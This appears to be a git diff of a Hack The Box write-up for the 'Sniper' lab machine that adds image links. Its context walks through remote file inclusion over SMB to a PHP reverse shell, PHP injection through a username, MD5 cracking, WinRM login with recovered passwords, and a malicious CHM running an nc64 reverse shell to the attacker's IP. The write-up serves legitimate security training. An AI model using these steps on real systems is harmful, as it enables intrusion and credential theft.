@@ -1,5 +1,5 @@
 # Sniper [HTB](https://app.hackthebox.com/machines/211)
-![sniper-01]()
+![sniper-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/sniper-01.png)
 
 
 ## Recon
@@ -10,7 +10,7 @@ After adding the target to my `/etc/hosts` file, I start scanning for open ports
 nmap -p- --min-rate 10000 sniper.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/ports-02.png)
 
 
 From here I send `nmap` to start probing the found ports for more information:
@@ -19,7 +19,7 @@ From here I send `nmap` to start probing the found ports for more information:
 nmap -p 80,135,139,445,49667 -sCV sniper.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/nmap-res-03.png)
 
 We have the following:
 
@@ -41,7 +41,7 @@ I start examining the SMB server by trying to list out the available shares usin
 smbclient -N -L \\\\sniper.htb\\
 ```
 
-![smb-fail-04]()
+![smb-fail-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/smb-fail-04.png)
 
 
 This is usually an indication that the SMB server is not the way forward. Maybe it will be once we get creds, but at the moment, not much we can do.
@@ -54,7 +54,7 @@ Let's check the IIS server!
 
 Browsing towards `http://sniper.htb/` returns the following page:
 
-![site-06]()
+![site-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/site-06.png)
 
 
 It appears that the company is offering delivery services. The three windows at the top lead to nowhere, but the two windows at the button do link to interesting pages.
@@ -64,7 +64,7 @@ It appears that the company is offering delivery services. The three windows at 
 
 This windows links to `http://sniper.htb/blog/index.php` which looks like this:
 
-![blog-07]()
+![blog-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/blog-07.png)
 
 
 At the top strip we can three buttons, `Home` redirects back to the main page, `Language` allows you to select one of three languages (English, Spanish & French), which loads a dedicated PHP script for each language. In other words, there is a file inclusion mechanism at play here, which is important so I'll note that. The `Downloads` button has two tabs, one for `Tools` and the other is for `backlink`, though both links lead to the current page.
@@ -80,14 +80,14 @@ Other then that, not much else to see on this page.
 
 This windows links to `http://sniper.htb/user/login.php` which returns a login prompt:
 
-![user-portal-08]()
+![user-portal-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/user-potal-08.png)
 
 
 At the button we also have a link for the registration form at `http://sniper.htb/user/registration.php`. 
 
 Trying to login with some weak creds results in the following page:
 
-![faild-login-09]()
+![faild-login-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/failed-login-09.png)
 
 
 I tried a few other weak credentials like `admin : admin`, `admin : aniper`, etc, all faild. I also tried a few basic SQLi payloads but to no avail. 
@@ -104,7 +104,7 @@ But this didn't really lead to anything super interesting or novel. I also ran a
 
 At this point I decided to create an account and log in:
 
-![construction-10]()
+![construction-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/construction-10.png)
 
 
 They say that the user portal is "under construction". At first, I wasn't sure where to go from here, so I ran another directory scan againts the `/user`  directory using:
@@ -113,7 +113,7 @@ They say that the user portal is "under construction". At first, I wasn't sure w
 ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://sniper.htb/user/FUZZ -e .txt,.html,.php,.config
 ```
 
-![user-ffuf-11]()
+![user-ffuf-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/user-ffuf-11.png)
 
 
 The most interesting entry by far is the `db.php` file, which is probably used to connect to the backend database, but we can see the response from the server is empty.
@@ -133,7 +133,7 @@ Eventually I went back to the language selection feature at `http://sniper.htb/b
 
 If we click on one of the languages and intercept the traffic in Burp, we can see the following request:
 
-![request-12]()
+![request-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/request-12.png)
 
 
 I send this request to Burp's Repeater so I can play around with it. 
@@ -141,7 +141,7 @@ I send this request to Burp's Repeater so I can play around with it.
 
 At first I tried local file inclusion techniques, for example, I tried to pull the `/user/db.php` script with the following request:
 
-![local-request-13]()
+![local-request-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/local-request-13.png)
 
 
 I also tried the following payloads which all faild:
@@ -157,8 +157,7 @@ blog-en.php/../user/db.php
 
 But supplying a full path, seems to work:
 
-![full-path-13.5]()
-
+![full-path-13.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/full-path-13.5.png)
 
 
 We can try to enumerate useful files on the target in this manner, though it's not the most efficient strategy, so I started looking into remote file inclusion instead. At first, I hosted a python web server on my attack machine, and supplied the URL of my server to the application, this didn't work. 
@@ -172,17 +171,17 @@ impacket-smbserver -smb2support s .
 
 And sent the UNC path of my server to the application:
 
-![unc-payload-14]()
+![unc-payload-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/unc-payload-14.png)
 
 
 This stalled the server for a sec, and on my SMB server I got a connection:
 
-![conn-15]()
+![conn-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/conn-15.png)
 
 
 From here, I downloaded `Ivan-Sincek`'s [php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) and made sure to point the script to my attack machine at the buttom:
 
-![changes-16]()
+![changes-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/changes-16.png)
 
 
 I start the SMB server once again, and I also start my local listener with:
@@ -193,23 +192,24 @@ rlwrap nc -lnvp 443
 
 Then, I send the following payload to the target:
 
-![stalls-17]()
+![stalls-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/stals-17.png)
 
 
 We can see the server stalls, and on my netcat listener I get a shell:
 
-![shell-18]()
+![shell-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/shell-18.png)
 
 
 ## Privilege Escalation
 
 After landing on the box as the `iis apppool` service account, I immediately check for any `Se` privileges:
 
-![se-privs-19]()
+![se-privs-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/se-privs-19.png)
+
 
 We can see we have the `Impersonate` privilege enabled, as it's often the case with Windows service accounts. Since our target machine is a 2019 Windows server:
 
-![sysinfo-20]()
+![sysinfo-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/sysinfo-20.png)
 
 
 We can use something like [Rouge Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato) to get escalate to `NY AUTHORITY`. But this is not fun, it's too easy.
@@ -217,12 +217,12 @@ We can use something like [Rouge Potato](https://jlajara.gitlab.io/Potatoes_Wind
 
 Instead, I want to go check the `/user/db.php` script from earlier:
 
-![db-script-21]()
+![db-script-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/db-script-21.png)
 
 
 We can see the connection string, with the creds to the database. There where also other interesting files in the `user` directory:
 
-![user-dir-22]()
+![user-dir-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/user-dir-22.png)
 
 
 At first, I looked at the two registration files present, as there is an old one and a new one. I copied files over to my attack machine through the SMB server as such:
@@ -235,17 +235,17 @@ copy registration_old123123123847.php \\10.10.14.63\s
 
 Then, I compared the two files with `diff`:
 
-![diff-23]()
+![diff-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/diff-23.png)
 
 
 We can see the new registration file added a few lines of input validation meant to remove the following characters `-$[(_.;&"\` from the supplied username. The genreal registration script looks like this:
 
-![registration-24]()
+![registration-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/registration-24.png)
 
 
 There is quite a lot of input validation from the application, but after solving the box I've seen people break this filter with a username like this `a<?php echo `whoami` ?>b`. Which can be chained with the LFI vulnerability to get command execution via retrieving the `C:\\windows\temp\sess_<id>` PHP session file:
 
-![rce-24.5]()
+![rce-24.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/rce-24.5.png)
 
 
 This was pretty cool, and there are ways to get a shell from this, but I will leave it for a later run of the box. Let's get back to the privesc. 
@@ -263,7 +263,7 @@ Instead, I decided to port forward the mysql service to my attack machine and ac
 netstat -ano
 ```
 
-![netstat-25]()
+![netstat-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/netstat-25.png)
 
 
 We can see two new ports that didn't show up in our inital `nmap` scan, which probably means they have been firewalled off. The `mysql` service runs on port `3306`, and port `5985` is actually an HTTP WinRM endpoint. So if we find creds, we can tunnel this port as well to get access to the system. 
@@ -292,7 +292,7 @@ And connect from the target to my server and tunnel port 3306:
 
 On my server I get the connection and the tunnel is established:
 
-![tunel-26]()
+![tunel-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/tunnel-26.png)
 
 
 Now I access the SQL server from my attack machine as such:
@@ -301,7 +301,7 @@ Now I access the SQL server from my attack machine as such:
 mysql -u dbuser -D sniper -p -P 3306
 ```
 
-![db-27]()
+![db-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/db-27.png)
 
 
 We can see there is one `users` table, let's dump everything from it:
@@ -310,7 +310,7 @@ We can see there is one `users` table, let's dump everything from it:
 select * from users;
 ```
 
-![table-28]()
+![table-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/table-28.png)
 
 
 We can see the `htb` user I created, and another `superuser` user. We know that the hashes are MD5, So I try to crack the superuser's hash using hashcat but it fails:
@@ -321,7 +321,7 @@ hashcat -m 0 -a 0 "6e573c8b25e9168e0c61895d821a3d57" rockyou.txt
 
 I try to look up the hash at [crackstation](https://crackstation.net/), but it fails again. So instead, I try [this site](https://md5.gromweb.com/) to "reverse" the hash and I get this:
 
-![crack-29]()
+![crack-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/crack-29.png)
 
 
 Trying to use the creds `superuser : $uperpassw0rd` to log in to the website works, which validates our finding. 
@@ -329,7 +329,7 @@ Trying to use the creds `superuser : $uperpassw0rd` to log in to the website wor
 
 From here I start thinking about the WinRM endpoint, and how I can login. So I take a look at the available user accounts on the system:
 
-![users-30]()
+![users-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/users-30.png)
 
 
 Could the creds work for `Chris`? 
@@ -347,26 +347,26 @@ I then try to connect to the WinRM endpoint using the password I scraped from th
 evil-winrm -i 127.0.0.1 -u chris -p '36mEAhz/B8xQ~2VM'
 ```
 
-![chris-31]()
+![chris-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/chris-31.png)
 
 
 ### Chris
 
 After I get a shell as `chris`, I start looking through he's home folder. In the `Downloads` directory I see the following file:
 
-![downloads-32]()
+![downloads-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/downloads-32.png)
 
 `.chm` files are what is known as [Microsoft Compiled HTML Help](https://en.wikipedia.org/wiki/Microsoft_Compiled_HTML_Help) which is Microsoft's proprietary online help format, consisting of a collection of HTML pages, an index and other navigation tools. The files are compressed and deployed in a binary format with the extension .CHM, for Compiled HTML. The format is often used for software documentation.
 
 
 The fact we are seeing this file here is not random, but at the moment it's unclear why it's here. If we keep looking around the filesystem we will find an unsual `Docs` directory in the `C:\\` drive, which looks like this:
 
-![docs-33]()
+![docs-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/docs-33.png)
 
 
 Previously we didn't have access to this directory, but now as `chris` we do. The `note.txt` file reads as such:
 
-![note-34]()
+![note-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/note-34.png)
 
 
 I have a strong suspicion this note wants us to drop a malicious `.chm` file into this directory. 
@@ -385,7 +385,7 @@ Then I compile my malicious `.chm` file a such:
 out-chm -payload "C:\\Windows\Tasks\nc64.exe 10.10.14.63 9001 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop\"
 ```
 
-![compile-35]()
+![compile-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/compile-35.png)
 
 
 This will execute `C:\\Windows\Tasks\nc64.exe` on the target to connect back to my attack machine. So the next step is to transfer `nc64.exe` to the specified path, and our malicious `doc.chm` file over to the `Docs` directory where it is expected. 
@@ -414,4 +414,4 @@ rlwrap nc -lnvp 9001
 
 And after a few seconds I get an admin shell:
 
-![root-36]()
+![root-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sniper/img/root-36.png)
